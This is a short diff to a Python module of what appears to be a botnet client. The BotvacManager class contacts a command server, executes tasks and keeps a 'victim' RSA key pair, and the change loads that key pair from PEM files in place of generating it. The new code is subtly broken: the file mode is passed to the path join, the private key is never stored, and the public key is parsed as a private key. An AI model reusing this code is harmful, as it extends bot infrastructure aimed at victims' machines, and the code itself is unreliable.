@@ -5,8 +5,8 @@ from datetime import datetime
 from urllib.parse import urljoin
 
 import requests
+import rsa
 import schedule as schedule
-from Crypto.PublicKey import RSA
 from rsa import PublicKey
 
 from bot.botvac_task_executer import BotvacTaskExecutor
@@ -36,9 +36,13 @@ class BotvacManager:
 
     def generate_keys(self):
         self.server_public_key = self.get_public_key()
-        main_key = RSA.generate(1024)
-        self.victim_public_key = main_key.public_key()
-        self.victim_private_key = main_key.private_key()
+        current_path = os.path.dirname(os.path.realpath(__file__))
+        res_path = os.path.join(current_path, "res")
+        with open(os.path.join(res_path, 'private_key.pem', mode='rb')) as private_file:
+            self.victim_public_key = rsa.PrivateKey.load_pkcs1(private_file.read())
+
+        with open(os.path.join(res_path, 'public_key.pem', mode='rb')) as public_file:
+            self.victim_public_key = rsa.PrivateKey.load_pkcs1(public_file.read())
 
     def update_last_task(self):
         url = urljoin(self.SERVER_ADDRESS, "/update_last_task")
